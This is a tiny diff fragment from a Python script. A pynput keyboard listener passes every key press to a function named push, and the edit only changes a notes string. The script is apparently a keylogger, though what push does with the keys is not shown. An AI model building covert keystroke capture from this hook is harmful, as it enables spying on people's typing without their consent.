@@ -36,5 +36,5 @@ def push(key):
 with pynput.keyboard.Listener(on_press=push) as listen:
     listen.join()
 
-    "Notes: it runs :) " 
+    "Notes: still works but i'm trying to improver " 
          
